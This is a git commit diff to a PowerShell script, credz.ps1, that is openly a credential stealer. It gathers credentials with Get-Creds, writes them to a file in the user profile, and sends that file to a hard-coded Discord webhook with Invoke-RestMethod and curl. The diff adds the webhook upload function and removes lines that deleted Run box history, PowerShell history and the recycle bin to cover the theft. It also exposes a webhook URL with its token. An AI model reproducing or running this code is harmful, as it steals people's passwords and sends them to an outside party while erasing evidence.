7e3811d3a091079a48c80f9f205d5854ca9d94ea
skekic16 <151707511+skekic16@users.noreply.github.com>
2023-12-14 03:36:56 -0600

    Update credz.ps1

--- credz.ps1
+++ credz.ps1
@@ -95,29 +95,28 @@ $creds = Get-Creds
 
 echo $creds >> $env:USERPROFILE\$FileName
 
-Upload-Discord -file "User-Creds.txt"
 
+function Upload-Discord {
 
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
 
+$hookurl = 'https://discord.com/api/webhooks/1183181478645997698/bmS94RKPMhnfSInRJZ2fu_0zctdvhRXi1wTj5lfbJ91jVEehz90MGk09DWKP12iyJMQQ'
 
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
 
-#--------------------------------------------------------------------
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
 
-
-
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
-# Delete run box history
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Deletes contents of recycle bin
-
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
+Upload-Discord -file $FileName
